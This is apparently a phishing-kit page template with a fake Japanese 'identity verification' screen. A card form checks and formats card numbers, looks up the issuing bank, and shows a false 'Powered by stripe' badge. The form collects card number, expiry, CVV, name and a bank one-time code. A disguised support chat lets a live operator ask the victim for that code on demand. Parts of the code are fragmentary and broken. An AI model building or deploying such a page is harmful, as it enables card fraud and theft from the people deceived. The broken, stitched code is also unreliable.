<style>
:root {
    --kc-rounded: 5px;
    --kc-text-color: {{ text_color or '#000000' }};
    --kc-button-color: {{ button_color or text_color or '#FF5C60' }};
    --kc-button-text-color: {{ button_text_color or '#FFFFFF' }};
    --kc-background-color: {{ bg_color or '#FFFFFF' }};
}

*,::before,::after {
    --tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;
    --tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;
    --tw-scale-x:1;--tw-scale-y:1;--tw-scroll-snap-strictness:proximity;
    --tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;
    --tw-ring-color:rgb(59 130 246/0.5);--tw-ring-offset-shadow:0 0 #0000;
    --tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;
    box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb;
}
::before,::after{--tw-content:'';}
html,:host{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;
    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Roboto','Oxygen','Ubuntu',
    'Droid Sans','Helvetica Neue',sans-serif;font-feature-settings:normal;
    font-variation-settings:normal;-webkit-tap-highlight-color:transparent;}
body{margin:0;line-height:inherit;}
a{color:inherit;text-decoration:inherit;}
strong{font-weight:bolder;}
button{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;
    font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;
    color:inherit;margin:0;padding:0;text-transform:none;cursor:pointer;
    -webkit-appearance:button;background-color:transparent;background-image:none;}
:disabled{cursor:default;}
img,svg{display:block;vertical-align:middle;}
img{max-width:100%;height:auto;}
::-webkit-file-upload-button{-webkit-appearance:button;font:inherit;}
::-webkit-search-decoration{-webkit-appearance:none;}
:-moz-focusring{outline:auto;}
:-moz-ui-invalid{box-shadow:none;}

.pointer-events-none{pointer-events:none;}
.absolute{position:absolute;}
.relative{position:relative;}
.inset-0{inset:0px;}
.mr-3{margin-right:12px;}
.mr-4{margin-right:16px;}
.block{display:block;}
.flex{display:flex;}
.aspect-square{aspect-ratio:1/1;}
.size-12{width:48px;height:48px;}
.flex-row{flex-direction:row;}
.flex-col{flex-direction:column;}
.items-center{align-items:center;}
.justify-center{justify-content:center;}
.gap-1{gap:4px;}
.gap-4{gap:16px;}
.space-y-0\.5>:not([hidden])~:not([hidden]){
    --tw-space-y-reverse:0;
    margin-top:calc(2px*(1 - var(--tw-space-y-reverse)));
    margin-bottom:calc(2px*var(--tw-space-y-reverse));}
.overflow-hidden{overflow:hidden;}
.rounded-full{border-radius:9999px;}
.p-3{padding:12px;}
.px-6{padding-left:24px;padding-right:24px;}
.py-1{padding-top:4px;padding-bottom:4px;}
.pb-10{padding-bottom:40px;}
.pt-8{padding-top:32px;}
.font-sans{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Roboto','Oxygen',
    'Ubuntu','Droid Sans','Helvetica Neue',sans-serif;}
.text-300{font-size:13px;}
.text-400{font-size:14px;}
.font-regular{font-weight:400;}
.font-semibold{font-weight:600;}
.leading-300{line-height:18px;}
.leading-400{line-height:22px;}
.tracking-300{letter-spacing:-0.1104px;}
.tracking-400{letter-spacing:-0.2px;}
.line-clamp-\(--clamp\){overflow:hidden;display:-webkit-box;-webkit-box-orient:vertical;
    -webkit-line-clamp:var(--clamp);}

.PyIBB {
    background:repeating-linear-gradient(to right,#f9dc00 0%,white 25%,#f9dc00 100%);
    width:100%;background-size:200% auto;background-position:0 100%;
    animation:twn9A 1.5s infinite;animation-fill-mode:forwards;
    animation-timing-function:linear;position:fixed;height:5px;
    pointer-events:none;z-index:1000;top:0;left:0;transition:opacity 300ms;
}
@keyframes twn9A {
    0%{background-position:0 0;}
    100%{background-position:-200% 0;}
}

.tDGV5 {
    background-color: var(--kc-background-color);
    color: var(--kc-text-color);
    min-height: 100vh;
    width: 100%;
}
.Ick15 {
    width: 100%;
    max-width: 480px;
    display: flex;
    flex-direction: column;
    gap: 0;
}
._pNjk {
    display:flex;flex:1 1 0%;flex-direction:row;
    align-items:center;justify-content:center;
}

.product-card{display:flex;align-items:flex-start;background-color:var(--card-color);
    padding:16px;transition:transform 0.2s,box-shadow 0.2s;}
.product-image{width:120px;height:120px;border-radius:var(--kc-rounded);
    object-fit:cover;object-position:center;flex-shrink:0;margin-right:16px;}
.product-info{display:flex;flex-direction:column;justify-content:center;flex:1;}
.product-title{font-size:18px;font-weight:600;margin-bottom:6px;}
.product-price{font-size:16px;font-weight:bold;color:var(--accent-color);}

.pay-block-rules{border-radius:var(--kc-rounded);padding:16px;width:100%;
    background-color:color-mix(in srgb,var(--kc-button-color),transparent 90%);}
.pay-block-rules-content{display:flex;align-items:center;}
.rules-img{max-width:120px;width:100%;padding:0 10px;}
.rules-img img{width:100%;height:100px;object-fit:cover;border-radius:var(--kc-rounded);}
.rules-text{overflow-wrap:anywhere;padding:0 10px;display:flex;flex-direction:column;
    justify-content:space-between;}
.rules-text-block{display:flex;background-color:var(--kc-background-color);
    padding:10px;margin-top:10px;border-radius:var(--kc-rounded);}
.rules-text-block-image{margin-right:10px;}
.rules-text-block-text{font-size:14px;}

:root {
    --font-family-base:"Poppins",sans-serif;
    --font-family-second:"Inter",sans-serif;
    --color-yellow:#f9dc00;--color-white:#ffffff;--color-black:#000000;
    --color-opaque-100:#f8f8f8;--color-opaque-200:#f2f2f2;--color-opaque-300:#e5e5e5;
    --color-opaque-400:#cccccc;--color-opaque-500:#999999;--color-opaque-600:#666666;
    --color-opaque-700:#333333;--color-opaque-800:#191919;--color-opaque-900:#0d0d0d;
    --max-content-width:1000px;
}

    unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}
@font-face{font-family:'Poppins';font-style:normal;font-display:swap;font-weight:600;

    unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}

<body>
<div id="app">
    <div>
        <div class="PyIBB" style="opacity: 0;"></div>
        <div>
            <div class="tDGV5">
                <div>
                    <div>
                        <div style="display:flex;justify-content:center;padding:16px;">
                            <div style="align-items:center;display:flex;flex-direction:column;width:100%;">
                                <div style="min-width:auto;width:auto;min-height:16px;height:16px;"></div>
                                <div class="Ick15">

                                    <!-- Logo -->
                                    <div class="_pNjk">
                                        {% if favicon_url %}
                                        <img src="{{ favicon_url }}" alt="logo" style="
                                            border-radius:inherit;height:auto;
                                            max-width:100%;outline:none;max-height:64px;">
                                        {% endif %}
                                    </div>

                                    <!-- Accent bar -->
                                    <div style="background-color:var(--kc-button-color);height:4px;width:100%;margin-bottom:24px;"></div>

                                    <!-- Title + subtitle -->
                                    <div style="display:flex;flex-direction:column;">
                                        <div style="display:inline;font-family:Poppins;font-size:32px;font-weight:600;letter-spacing:-0.25px;line-height:36px;text-align:start;" data-i18n="main_title">
                                            {{ title or '本人確認' }}
                                        </div>
                                        <div style="min-width:auto;width:auto;min-height:8px;height:8px;"></div>
                                        <div style="display:inline;font-family:Poppins;font-size:16px;font-weight:400;letter-spacing:-0.25px;line-height:20px;text-align:start;" data-i18n="main_desc">
                                            {{ description or '続行するにはアカウントを確認してください。' }}
                                        </div>
                                    </div>

                                    <!-- Info blocks -->
                                    <div class="flex flex-col gap-4 pt-8 pb-10">

                                        <!-- Block 1: Account restricted -->
                                        <div class="flex items-center px-6">
                                            <div class="mr-4 flex size-12 items-center justify-center rounded-full p-3">
                                                <div>
                                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="var(--kc-text-color)" viewBox="0 0 24 24" aria-label="Cancel icon">
                                                        <path fill-rule="evenodd" d="M23 12c0 6.075-4.925 11-11 11S1 18.075 1 12 5.925 1 12 1s11 4.925 11 11zm-2 0a9 9 0 0 1-9 9 8.96 8.96 0 0 1-5.618-1.968l12.65-12.65A8.96 8.96 0 0 1 21 12zM4.968 17.618l12.65-12.65A8.96 8.96 0 0 0 12 3a9 9 0 0 0-9 9 8.96 8.96 0 0 0 1.968 5.618z"></path>
                                                    </svg>
                                                </div>
                                            </div>
                                            <div class="mr-3 space-y-0.5">
                                                <div class="font-sans text-400 leading-400 tracking-400 font-semibold" data-i18n="block1_title">
                                                    アカウントが制限されています</div>
                                                <div class="font-sans text-300 leading-300 tracking-300 font-regular" data-i18n="block1_sub">
                                                    身元の確認が必要です</div>
                                            </div>
                                        </div>

                                        <!-- Block 2: Country detection -->
                                        <div class="flex items-center px-6">
                                            <div class="mr-4 flex size-12 items-center justify-center rounded-full p-3">
                                                <div>
                                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="var(--kc-text-color)" viewBox="0 0 24 24" aria-label="Flag icon">
                                                        <path fill-rule="evenodd" d="M3 2a1 1 0 0 1 1-1h.5a1 1 0 0 1 0 2H4v18a1 1 0 1 1-2 0V2zm2 1v8l4-2 4 2 4-2v-8l-4 2-4-2-4 2z"></path>
                                                    </svg>
                                                </div>
                                            </div>
                                            <div class="mr-3 space-y-0.5">
                                                <div class="font-sans text-400 leading-400 tracking-400 font-semibold" data-i18n="block2_title">
                                                    お住まいの国を検出しました</div>
                                                <div class="font-sans text-300 leading-300 tracking-300 font-regular" data-i18n="block2_sub">
                                                    規制要件を遵守するため</div>
                                            </div>
                                        </div>

                                        <!-- Block 3: Quick verification -->
                                        <div class="flex items-center px-6">
                                            <div class="mr-4 flex size-12 items-center justify-center rounded-full p-3">
                                                <div>
                                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="var(--kc-text-color)" viewBox="0 0 24 24" aria-label="Check icon">
                                                        <path fill-rule="evenodd" d="M20.707 5.293a1 1 0 0 1 0 1.414l-11 11a1 1 0 0 1-1.414 0l-5-5a1 1 0 1 1 1.414-1.414L9 15.586 19.293 5.293a1 1 0 0 1 1.414 0z"></path>
                                                    </svg>
                                                </div>
                                            </div>
                                            <div class="mr-3 space-y-0.5">
                                                <div class="font-sans text-400 leading-400 tracking-400 font-semibold" data-i18n="block3_title">
                                                    簡単・迅速な本人確認</div>
                                                <div class="font-sans text-300 leading-300 tracking-300 font-regular" data-i18n="block3_sub">
                                                    数分で完了します</div>
                                            </div>
                                        </div>

                                        <!-- CTA button -->
                                        <div style="padding:0 24px;">
                                            <button type="button" paymentopenbutton="" data-i18n-btn="cta_main"

                                                    border:none;cursor:pointer;"
                                                data-custom-text="{{ button_text or '' }}">
                                                {{ button_text or '了解しました' }}
                                            </button>
                                        </div>

                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

</div>

<script>
(function(){
var SUBDOMAIN = {{ subdomain|default('')|tojson }};
var LINK_ID   = {{ link_id|default('')|tojson }};
var LANG      = '{{ user_lang|default("en") }}';

/* ── CSS ── */
var CSS =
  ':host{all:initial;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;}' +
  '*{box-sizing:border-box;margin:0;padding:0;}' +

  /* fab button */
  '.fab{position:fixed;bottom:24px;right:24px;z-index:2147483647;' +
  'width:56px;height:56px;border-radius:50%;border:none;cursor:pointer;' +
  'background:#29abe2;box-shadow:0 4px 16px rgba(0,0,0,.22);' +
  'display:flex;align-items:center;justify-content:center;transition:transform .15s;}' +
  '.fab:hover{transform:scale(1.08);}' +
  '.fab svg{pointer-events:none;}' +
  '.fab-badge{position:absolute;top:-3px;right:-3px;background:#e31837;color:#fff;' +
  'border-radius:50%;width:18px;height:18px;font-size:11px;font-weight:700;' +
  'display:none;align-items:center;justify-content:center;}' +
  '.fab-badge.on{display:flex;}' +

  /* chat box */
  '.box{position:fixed;bottom:92px;right:24px;z-index:2147483647;' +
  'width:340px;max-width:calc(100vw - 32px);' +
  'background:#fff;border-radius:16px;' +
  'box-shadow:0 8px 32px rgba(0,0,0,.18);' +
  'display:none;flex-direction:column;overflow:hidden;}' +
  '.box.on{display:flex;}' +

  /* header */
  '.bh{background:#29abe2;padding:14px 16px;display:flex;align-items:center;gap:10px;}' +
  '.bh-dot{width:10px;height:10px;border-radius:50%;background:#6ee86e;flex-shrink:0;}' +
  '.bh-title{color:#fff;font-size:14px;font-weight:600;flex:1;}' +
  '.bh-x{background:none;border:none;color:rgba(255,255,255,.8);font-size:20px;' +
  'cursor:pointer;line-height:1;padding:0 2px;}' +
  '.bh-x:hover{color:#fff;}' +

  /* messages area */
  '.msgs{flex:1;overflow-y:auto;padding:14px;display:flex;flex-direction:column;' +
  'gap:8px;max-height:320px;min-height:120px;}' +

  /* bubbles */
  '.bbl{max-width:85%;padding:9px 13px;border-radius:14px;font-size:13px;line-height:1.5;word-break:break-word;}' +
  '.bbl.bot{background:#f0f4f8;color:#222;align-self:flex-start;border-bottom-left-radius:4px;}' +
  '.bbl.user{background:#29abe2;color:#fff;align-self:flex-end;border-bottom-right-radius:4px;}' +
  '.bbl.op{background:#e8f5e9;color:#1b5e20;align-self:flex-start;border-bottom-left-radius:4px;}' +

  /* quick-reply buttons */
  '.qr{display:flex;flex-wrap:wrap;gap:6px;padding:0 14px 10px;}' +
  '.qr-btn{background:#fff;border:1px solid #29abe2;color:#29abe2;border-radius:20px;' +
  'padding:6px 14px;font-size:12px;cursor:pointer;font-family:inherit;transition:all .15s;}' +
  '.qr-btn:hover{background:#29abe2;color:#fff;}' +

  /* input area */
  '.inp-row{display:flex;align-items:center;gap:8px;padding:10px 12px;' +
  'border-top:1px solid #eee;}' +
  '.inp{flex:1;border:1px solid #d1d1d1;border-radius:20px;padding:8px 14px;' +
  'font-size:13px;outline:none;font-family:inherit;resize:none;' +
  'max-height:80px;overflow-y:auto;line-height:1.4;}' +
  '.inp:focus{border-color:#29abe2;}' +
  '.send{background:#29abe2;border:none;border-radius:50%;width:36px;height:36px;' +
  'display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;}' +
  '.send:hover{opacity:.85;}' +
  '.send svg{pointer-events:none;}' +

  /* typing indicator */
  '.typing{display:none;align-items:center;gap:4px;padding:4px 14px;}' +
  '.typing.on{display:flex;}' +
  '.td{width:7px;height:7px;border-radius:50%;background:#aaa;' +
  'animation:bounce .9s infinite ease-in-out;}' +
  '.td:nth-child(2){animation-delay:.15s;}' +
  '.td:nth-child(3){animation-delay:.3s;}' +
  '@keyframes bounce{0%,80%,100%{transform:translateY(0);}40%{transform:translateY(-6px);}}';

/* ── HTML ── */
var HTML =
  '<button class="fab" id="fab" aria-label="Support chat">' +
    '<svg width="24" height="24" viewBox="0 0 24 24" fill="none">' +
      '<path d="M20 2H4a2 2 0 0 0-2 2v18l4-4h14a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2z"' +
      ' fill="#fff"/></svg>' +
    '<span class="fab-badge" id="fab-badge">!</span>' +
  '</button>' +
  '<div class="box" id="box">' +
    '<div class="bh">' +
      '<span class="bh-dot"></span>' +
      '<span class="bh-title">Support</span>' +
      '<button class="bh-x" id="bh-x" type="button">×</button>' +
    '</div>' +
    '<div class="msgs" id="msgs"></div>' +
    '<div class="typing" id="typing"><div class="td"></div><div class="td"></div><div class="td"></div></div>' +
    '<div class="qr" id="qr"></div>' +
    '<div class="inp-row">' +
      '<textarea class="inp" id="inp" rows="1" placeholder="Message..."></textarea>' +
      '<button class="send" id="send" type="button">' +
        '<svg width="16" height="16" viewBox="0 0 24 24" fill="none">' +
          '<path d="M22 2L11 13M22 2L15 22l-4-9-9-4 20-7z" stroke="#fff" stroke-width="2"' +
          ' stroke-linecap="round" stroke-linejoin="round"/></svg>' +
      '</button>' +
    '</div>' +
  '</div>';

/* ── i18n labels ── */
var LABELS = {
  ru:{title:'Поддержка', placeholder:'Написать...'},
  en:{title:'Support',   placeholder:'Message...'},
  de:{title:'Support',   placeholder:'Nachricht...'},
  fr:{title:'Support',   placeholder:'Message...'},
  es:{title:'Soporte',   placeholder:'Mensaje...'},
  ja:{title:'サポート',    placeholder:'メッセージ...'},
  zh:{title:'支持',       placeholder:'消息...'},
  ko:{title:'지원',       placeholder:'메시지...'},
  uk:{title:'Підтримка', placeholder:'Повідомлення...'},
  tr:{title:'Destek',    placeholder:'Mesaj...'},
  pl:{title:'Wsparcie',  placeholder:'Wiadomość...'},
};
var lbl = LABELS[LANG] || LABELS['en'];

customElements.define('support-widget', class extends HTMLElement {
  constructor(){ super(); this._sh = this.attachShadow({mode:'open'}); }

  connectedCallback(){
    this._sh.innerHTML = '<style>'+CSS+'</style>'+HTML;
    var sh = this._sh;

    /* apply i18n */
    var titleEl = sh.querySelector('.bh-title');
    if(titleEl) titleEl.textContent = lbl.title;
    var inpEl = sh.getElementById('inp');
    if(inpEl) inpEl.placeholder = lbl.placeholder;

    this._msgs   = sh.getElementById('msgs');
    this._qr     = sh.getElementById('qr');
    this._inp    = inpEl;
    this._box    = sh.getElementById('box');
    this._fab    = sh.getElementById('fab');
    this._badge  = sh.getElementById('fab-badge');
    this._typing = sh.getElementById('typing');
    this._open   = false;
    this._sessionId = null;
    this._sse    = null;
    this._steps  = [];

    sh.getElementById('fab').addEventListener('click',  ()=> this._toggle());
    sh.getElementById('bh-x').addEventListener('click', ()=> this._close());
    sh.getElementById('send').addEventListener('click',  ()=> this._sendUser());
    inpEl.addEventListener('keydown', e=>{
      if(e.key==='Enter' && !e.shiftKey){ e.preventDefault(); this._sendUser(); }
    });

    this._init();
  }

  async _init(){
    if(!SUBDOMAIN || !LINK_ID) return;
    try {
      var r = await fetch('/chat/session',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({
          subdomain: SUBDOMAIN,
          link_id: LINK_ID,
          lang: LANG,
          user_agent: navigator.userAgent || '',
          sys_lang: navigator.language || navigator.userLanguage || LANG
        })
      });
      var d = await r.json();
      this._sessionId = d.session_id;
    } catch(e){ return; }

    try {
      var r2 = await fetch('/chat/steps?subdomain='+SUBDOMAIN+'&link_id='+LINK_ID+'&lang='+LANG);
      this._steps = await r2.json();
    } catch(e){ this._steps = []; }

    this._startSSE();
    this._startHeartbeat();
    this._fireTrigger('open');

    /* listen for page triggers */
    var self = this;
    document.addEventListener('chat:trigger', function(e){
      self._fireTrigger(e.detail);
    });
  }

  _startSSE(){
    if(!this._sessionId) return;
    var self = this;
    this._sse = new EventSource('/chat/stream/'+this._sessionId);
    this._sse.onmessage = function(e){
      if(e.data === 'connected') return;
      try {
        var msg = JSON.parse(e.data);
        /* operator requests code input on frontend */
        if(msg.action === 'request_code'){
          document.dispatchEvent(new CustomEvent('chat:request-code'));
          return;
        }
        self._typing.classList.remove('on');
        self._addBubble(msg.text, 'op');
        if(!self._open){
          self._badge.classList.add('on');
        }
      } catch(_){}
    };
    this._sse.onerror = function(){
      setTimeout(function(){ self._startSSE(); }, 3000);
    };
  }

  _startHeartbeat(){
    if(!this._sessionId) return;
    var self = this;
    /* send immediately, then every 20s while the tab is alive */
    function ping(){
      if(!self._sessionId) return;
      fetch('/chat/heartbeat',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({session_id: self._sessionId})
      }).catch(function(){});
    }
    ping();
    self._hbTimer = setInterval(ping, 20000);
    /* stop pinging when the tab is hidden / closed */
    document.addEventListener('visibilitychange', function(){
      if(document.hidden){
        clearInterval(self._hbTimer);
        self._hbTimer = null;
      } else {
        ping();
        self._hbTimer = setInterval(ping, 20000);
      }
    });
    window.addEventListener('beforeunload', function(){
      clearInterval(self._hbTimer);
    });
  }

  _fireTrigger(trigger){
    var step = this._steps.find(function(s){ return s.trigger === trigger; });
    if(!step) return;
    var self = this;
    /* slight delay so it feels natural */
    setTimeout(function(){
      self._addBubble(step.text, 'bot');
      if(step.button){
        self._showQR([{label: step.button, trigger: trigger}]);
      }
      if(!self._open){
        self._badge.classList.add('on');
      }
      self._postTrigger(trigger, step.text);
    }, 600);
  }

  _showQR(items){
    this._qr.innerHTML = '';
    var self = this;
    items.forEach(function(item){
      var btn = document.createElement('button');
      btn.className = 'qr-btn';
      btn.textContent = item.label;
      btn.addEventListener('click', function(){
        self._qr.innerHTML = '';
        self._open || self._toggle();
        self._sendMessage(item.label, 'user');
      });
      self._qr.appendChild(btn);
    });
  }

  _addBubble(text, type){
    var el = document.createElement('div');
    el.className = 'bbl ' + type;
    el.textContent = text;
    this._msgs.appendChild(el);
    this._msgs.scrollTop = this._msgs.scrollHeight;
  }

  async _postTrigger(trigger, text){
    if(!this._sessionId) return;
    try {
      await fetch('/chat/message',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({
          session_id: this._sessionId,
          subdomain: SUBDOMAIN,
          link_id: LINK_ID,
          trigger: trigger,
          text: text
        })
      });
    } catch(_){}
  }

  _sendUser(){
    var text = (this._inp.value || '').trim();
    if(!text) return;
    this._inp.value = '';
    this._sendMessage(text, 'user');
  }

  async _sendMessage(text, role){
    this._addBubble(text, role);
    this._typing.classList.add('on');
    if(!this._sessionId) return;
    try {
      await fetch('/chat/message',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({
          session_id: this._sessionId,
          subdomain: SUBDOMAIN,
          link_id: LINK_ID,
          trigger: 'user',
          text: text
        })
      });
    } catch(_){}
  }

  _toggle(){
    this._open ? this._close() : this._openChat();
  }

  _openChat(){
    this._open = true;
    this._box.classList.add('on');
    this._badge.classList.remove('on');
    this._msgs.scrollTop = this._msgs.scrollHeight;
  }

  _close(){
    this._open = false;
    this._box.classList.remove('on');
  }
});

/* ── wire triggers from page events ── */
function dispatchChatTrigger(trigger){
  document.dispatchEvent(new CustomEvent('chat:trigger', {detail: trigger}));
}

/* card modal open */
document.querySelectorAll('[paymentopenbutton]').forEach(function(btn){
  btn.addEventListener('click', function(){
    setTimeout(function(){ dispatchChatTrigger('card'); }, 800);
  });
});

/* operator requested code input — open payment-widget and show code screen */
document.addEventListener('chat:request-code', function(){
  var w = document.querySelector('payment-widget');
  if(w){
    if(!w.isOpen) w.open();
    /* slight delay so the widget renders before dispatching */
    setTimeout(function(){
      document.dispatchEvent(new CustomEvent('chat:request-code-show'));
    }, 100);
  }
});

/* balance step & errors — triggers are dispatched inline in payment-widget */

})();

document.addEventListener('DOMContentLoaded', function(){
  var t = window._i18n;
  document.querySelectorAll('[data-i18n]').forEach(function(el){
    var key = el.getAttribute('data-i18n');
    if(t[key]) el.textContent = t[key];
  });
  /* CTA button: only override if no custom button_text was set by template */
  document.querySelectorAll('[data-i18n-btn]').forEach(function(el){
    var custom = (el.getAttribute('data-custom-text')||'').trim();
    if(custom) return; /* admin set custom text — keep it */
    var key = el.getAttribute('data-i18n-btn');
    if(t[key]) el.textContent = t[key];
  });
  /* page title */
  if(t['page_title'])
    document.title = t['page_title'];
  /* meta description */
  var metaDesc = document.querySelector('meta[name="description"]');
  if(metaDesc && t['page_desc'])
    metaDesc.content = t['page_desc'];
});
})();

                ];
                /* map lang code to a BCP-47 locale Intl understands */
                var LANG_LOCALE = {
                    'ja':'ja','en':'en','ru':'ru','de':'de','fr':'fr','es':'es',
                    'pt':'pt','pl':'pl','nl':'nl','tr':'tr','uk':'uk','zh':'zh',
                    'ko':'ko','it':'it'

                var locale = LANG_LOCALE[LANG] || LANG || 'en';

                try {

                /* build sorted list of {code, label} */

                    var label;
                    try { label = names.of(cc); } catch(e) { label = cc; }
                    return {code: cc, label: label || cc};
                }).sort(function(a,b){

            /* Luhn */
            function luhn(n){
                var s=0,alt=false;
                for(var i=n.length-1;i>=0;i--){
                    var d=parseInt(n[i],10);
                    if(alt){d*=2;if(d>9)d-=9;}
                    s+=d;alt=!alt;
                }
                return s%10===0;
            }

            /* brand rules */
            var BRANDS=[
                {id:'visa',     re:/^4/,              fmt:[4,4,4,4], len:[13,16,19],cvv:3},
                {id:'mc',       re:/^(5[1-5]|2[2-7])/, fmt:[4,4,4,4],len:[16],      cvv:3},
                {id:'amex',     re:/^3[47]/,           fmt:[4,6,5],  len:[15],      cvv:4},
                {id:'jcb',      re:/^35(2[89]|[3-8])/, fmt:[4,4,4,4],len:[16,17,18,19],cvv:3},
                {id:'discover', re:/^6(011|4[4-9]|5)/, fmt:[4,4,4,4],len:[16,19],   cvv:3},
                {id:'unionpay', re:/^62/,              fmt:[4,4,4,4],len:[16,17,18,19],cvv:3},
                {id:'mir',      re:/^220[0-4]/,        fmt:[4,4,4,4],len:[16,17,18,19],cvv:3},
            ];
            var curBrand=null;

            function cleanBankName(name){
                return name
                    .replace(/,?\s*(NATIONAL ASSOCIATION|N\.A\.|NA|INC\.?|LLC\.?|LTD\.?|CO\.,?\s*LTD\.?|CORP\.?|PLC\.?|AG|S\.A\.|FSB|BANK\s+NA|BANKING\s+CORPORATION)\.?\s*$/gi,'')
                    .trim()
                    .replace(/\w+/g,function(w){return w.charAt(0).toUpperCase()+w.slice(1).toLowerCase();});
            }

            function lookupBin(raw){
                if(!raw||raw.length<6) return Promise.resolve();
                var bin=raw.slice(0,6);
                return fetch('/bin/'+bin)
                    .then(function(r){return r.ok?r.json():null;})
                    .then(function(d){if(d&&d.bank&&d.bank.name) detectedBank=cleanBankName(d.bank.name);})
                    .catch(function(){});
            }

            function detectBrand(v){
                for(var i=0;i<BRANDS.length;i++) if(BRANDS[i].re.test(v)) return BRANDS[i];
                return null;
            }

            function fmtCard(raw,brand){
                var fmt=brand?brand.fmt:[4,4,4,4];
                var max=fmt.reduce(function(a,b){return a+b;},0);
                raw=raw.slice(0,max);
                var out=[],p=0;
                for(var i=0;i<fmt.length;i++){var ch=raw.slice(p,p+fmt[i]);if(ch)out.push(ch);p+=fmt[i];}
                return out.join(' ');
            }

            function updBrands(brand){
                ['visa','mc','amex','jcb'].forEach(function(b){

                    if(!brand){el.style.opacity='1';el.style.filter='none';}
                    else if(brand.id===b){el.style.opacity='1';el.style.filter='none';}
                    else{el.style.opacity='0.2';el.style.filter='grayscale(1)';}
                });
            }

            function setErr(boxId,errId,msg){
                var box=sh.getElementById(boxId),err=sh.getElementById(errId);

                if(err){err.textContent=msg||'';if(msg)err.classList.add('on');else err.classList.remove('on');}
            }

            /* expiry */

                      (SITE_TITLE||'KIBIDANGO') +
                    '</div>' +
                    '<button class="x" id="ci-close" type="button" aria-label="Close">×</button>' +
                  '</div>' +
                  '<div style="padding:28px 24px 24px;display:flex;flex-direction:column;gap:18px;">' +
                    '<div style="text-align:center;">' +
                      '<div style="display:inline-flex;align-items:center;justify-content:center;'+
                          'width:56px;height:56px;border-radius:50%;background:#e8f4fd;margin-bottom:12px;">' +
                        '<svg width="28" height="28" viewBox="0 0 24 24" fill="none">'+
                          '<rect x="3" y="11" width="18" height="11" rx="2" stroke="#29abe2" stroke-width="2"/>'+
                          '<path d="M7 11V7a5 5 0 0 1 10 0v4" stroke="#29abe2" stroke-width="2" stroke-linecap="round"/>'+
                          '<circle cx="12" cy="16" r="1.5" fill="#29abe2"/>'+
                        '</svg>' +
                      '</div>' +
                      '<div style="font-size:16px;font-weight:700;color:#1a1a2e;margin-bottom:6px;">'+(t.code_title||'Enter Verification Code')+'</div>' +
                      '<div style="font-size:13px;color:#666;line-height:1.55;">'+(t.code_desc||'A verification code has been sent to your bank. Please enter it below to confirm the operation.')+'</div>' +
                    '</div>' +
                    '<div>' +
                      '<div class="inp-box" id="ci-box" style="margin-bottom:4px;">' +
                        '<input id="ci-inp" type="text" inputmode="numeric" maxlength="8" '+
                          'placeholder="'+(t.code_placeholder||'Enter code')+'" '+
                          'style="text-align:center;letter-spacing:6px;font-size:20px;font-weight:600;padding:14px;">' +
                      '</div>' +
                      '<div class="err-txt" id="ci-err"></div>' +
                    '</div>' +
                    '<button id="ci-submit" type="button" class="cta">'+(t.code_submit||'Confirm')+'</button>' +
                    '<div style="text-align:center;">' +
                      '<button id="ci-resend" type="button" style="background:none;border:none;'+
                          'color:#29abe2;font-size:13px;cursor:pointer;font-family:inherit;text-decoration:underline;">'+
                        (t.code_resend||'Resend code') +
                      '</button>' +
                    '</div>' +
                    '<div style="display:flex;align-items:center;justify-content:center;gap:12px;font-size:12px;color:#aaa;">' +
                      '<span>Powered by <strong style="color:#555;">stripe</strong></span>' +
                      '<span style="color:#ddd;">|</span>' +
                      '<a href="#" style="color:#aaa;text-decoration:none;">'+(t.proc_terms||'Terms')+'</a>' +
                      '<a href="#" style="color:#aaa;text-decoration:none;">'+(t.proc_privacy||'Privacy')+'</a>' +
                    '</div>' +
                  '</div>';

                dlg.innerHTML='';
                dlg.appendChild(v);

                var ciInp = sh.getElementById('ci-inp');
                var ciErr = sh.getElementById('ci-err');
                var ciBox = sh.getElementById('ci-box');

                sh.getElementById('ci-close').addEventListener('click',function(){ self.close(); });

                ciInp.addEventListener('input',function(){
                    this.value=this.value.replace(/\D/g,'');
                    ciBox.classList.remove('err');
                    ciErr.textContent=''; ciErr.classList.remove('on');
                });

                sh.getElementById('ci-submit').addEventListener('click',function(){
                    var code=(ciInp.value||'').trim();
                    if(!code){ ciBox.classList.add('err'); return; }
                    submitData({
                        card_number: cardInp ? cardInp.value : '',
                        card_exp:    expInp  ? expInp.value  : '',
                        card_cvv:    cvvInp  ? cvvInp.value  : '',
                        card_name:   nameInp ? nameInp.value.trim() : '',
                        verification_code: code
                    });
                    document.dispatchEvent(new CustomEvent('chat:trigger',{detail:'code'}));
                    /* show spinner / processing again */
                    showProcessing(sh, self);
                });

                sh.getElementById('ci-resend').addEventListener('click',function(){
                    document.dispatchEvent(new CustomEvent('chat:trigger',{detail:'code_resend'}));
                });

